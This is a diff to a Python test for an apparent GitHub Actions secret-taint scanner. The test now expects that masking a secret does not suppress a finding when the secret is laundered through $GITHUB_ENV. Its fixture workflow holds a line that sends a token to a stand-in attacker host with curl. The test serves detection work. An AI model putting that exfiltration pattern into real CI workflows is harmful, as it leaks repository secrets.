@@ -250,10 +250,12 @@ jobs:
 def test_mask_in_body_still_propagates_redirect_taint(
     tmp_path: Path,
 ) -> None:
-    """A body that masks one secret AND launders another via
-    $GITHUB_ENV should still propagate the laundered taint to
-    downstream steps.  Mask suppresses the ``run_block`` finding on
-    this step but doesn't disarm the cross-step propagation."""
+    """A body that masks a secret AND launders it via $GITHUB_ENV
+    must still propagate the laundered taint to downstream steps.
+    The mask exempts only the mask occurrence itself (add-mask hides
+    the value from log output, nothing more), so the laundering
+    write in the SAME body is a live secret reference: step 0 fires
+    on it AND the cross-step propagation stays armed."""
     _write_wf(tmp_path, "wf.yml", """\
 on: push
 jobs:
@@ -266,12 +268,13 @@ jobs:
       - run: curl https://evil.example/?t=$TOK
 """)
     hits = scan_target(tmp_path, [], [])
-    # Step 0 itself produces no run_block finding (mask suppresses).
+    # Step 0 fires on the $GITHUB_ENV laundering write — masking the
+    # secret earlier in the body is not cover for referencing it again.
     step_0 = [
         h for h in hits
         if h.sink_kind == "run_block" and h.step_index == 0
     ]
-    assert not step_0
+    assert step_0 and step_0[0].secret_names == ("NPM_TOKEN",)
     # Step 1 fires via the propagated taint binding.
     step_1 = [
         h for h in hits
